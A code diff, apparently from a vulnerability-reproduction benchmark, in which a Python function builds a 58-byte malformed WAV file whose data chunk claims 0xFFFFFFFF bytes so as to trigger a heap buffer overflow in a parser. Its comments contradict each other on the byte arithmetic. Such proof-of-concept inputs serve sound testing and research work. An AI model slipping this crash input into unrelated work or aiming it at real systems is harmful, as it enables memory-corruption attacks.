@@ -3,76 +3,64 @@ import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Create a malformed RIFF file that triggers heap buffer overflow
-        # by having a data size that exceeds the chunk bounds
+        # Construct a malformed RIFF file that triggers heap buffer overflow
+        # Structure: RIFF header + malformed chunk
         
-        # RIFF header
+        # RIFF header (12 bytes)
         riff_header = b'RIFF'
         
-        # File size: 50 bytes (58 total - 8 for 'RIFF' + size fields)
-        file_size = 50  # 58 - 8
+        # File size minus 8 bytes (will be 50 for 58 byte file)
+        # We'll craft a file that's exactly 58 bytes
+        total_file_size = 58
+        riff_size = struct.pack('<I', total_file_size - 8)  # 50 = 0x32
         
-        # WAVE format
-        wave_format = b'WAVE'
+        # Format type
+        format_type = b'WAVE'
         
-        # fmt chunk with PCM format
-        fmt_chunk = b'fmt '
-        fmt_size = 16  # PCM format chunk size
-        fmt_data = struct.pack('<HHIIHH',
-                               1,      # PCM format
-                               1,      # mono
-                               44100,  # sample rate
-                               88200,  # byte rate
-                               2,      # block align
-                               16)     # bits per sample
+        # First chunk header (fmt chunk - normally 16 bytes of data)
+        fmt_chunk_id = b'fmt '
+        # Set fmt chunk size to 16 (normal for PCM WAV)
+        fmt_chunk_size = struct.pack('<I', 16)
         
-        # data chunk with malformed size
-        data_chunk = b'data'
+        # PCM format data (16 bytes)
+        # Format code (1 = PCM), channels (1), sample rate (44100), 
+        # byte rate (88200), block align (2), bits per sample (16)
+        fmt_data = struct.pack('<HHIIHH', 1, 1, 44100, 88200, 2, 16)
         
-        # The vulnerability: data size claims 100 bytes but actual chunk is smaller
-        # This causes out-of-bounds read when processing data
-        claimed_data_size = 100  # Large size that exceeds actual chunk
+        # Create a data chunk with malformed size
+        data_chunk_id = b'data'
         
-        # Actual data we'll provide (much smaller than claimed size)
-        actual_data = b'\x00' * 10  # Only 10 bytes of actual data
+        # The vulnerability: data size not checked against RIFF chunk end
+        # Make data size larger than remaining space in RIFF chunk
+        # RIFF chunk size is 50, we've used: 12 (RIFF header) + 8 (fmt header) + 16 (fmt data) + 8 (data header) = 44 bytes
+        # Remaining in RIFF: 50 - (44 - 8) = 14 bytes (subtract 8 because RIFF size doesn't include 'RIFF' and size fields)
+        # Actually: RIFF size is 50, we've written: 4 (fmt) + 4 (fmt size) + 16 (fmt data) + 4 (data) + 4 (data size) = 32 bytes of chunk data
+        # So we have 50 - 32 = 18 bytes left in RIFF chunk
+        # Make data size larger than available space to trigger overflow
         
-        # Build the file:
-        # RIFF header + file_size + WAVE + fmt chunk + data chunk + actual data
-        # Total should be 58 bytes
+        # We'll make data size 0xFFFFFFFF (max uint32) to definitely overflow
+        data_chunk_size = struct.pack('<I', 0xFFFFFFFF)
         
-        # Calculate remaining bytes for padding to reach 58
-        current_length = (len(riff_header) + 4 + len(wave_format) +
-                         len(fmt_chunk) + 4 + len(fmt_data) +
-                         len(data_chunk) + 4 + len(actual_data))
+        # Put some initial data (can be anything)
+        initial_data = b'A' * 10  # 10 bytes of data
         
-        padding_needed = 58 - current_length
-        
-        # If padding needed is negative, adjust claimed_data_size
-        if padding_needed < 0:
-            # Reduce actual data
-            actual_data = actual_data[:len(actual_data) + padding_needed]
-            padding_needed = 0
-        
-        # Construct the malformed file
-        poc = (
+        # Combine all parts
+        poc_bytes = (
             riff_header +
-            struct.pack('<I', file_size) +
-            wave_format +
-            fmt_chunk +
-            struct.pack('<I', fmt_size) +
+            riff_size +
+            format_type +
+            fmt_chunk_id +
+            fmt_chunk_size +
             fmt_data +
-            data_chunk +
-            struct.pack('<I', claimed_data_size) +  # Malformed: claims 100 bytes
-            actual_data +
-            b'\x00' * padding_needed
+            data_chunk_id +
+            data_chunk_size +
+            initial_data
         )
         
-        # Verify total length is 58 bytes
-        if len(poc) != 58:
-            # Adjust if needed
-            if len(poc) > 58:
-                poc = poc[:58]
-            else:
-                poc = poc + b'\x00' * (58 - len(poc))
-        
-        return poc
+        # Pad to exactly 58 bytes to match ground truth
+        if len(poc_bytes) < total_file_size:
+            poc_bytes += b'\x00' * (total_file_size - len(poc_bytes))
+        elif len(poc_bytes) > total_file_size:
+            poc_bytes = poc_bytes[:total_file_size]
+            
+        return poc_bytes
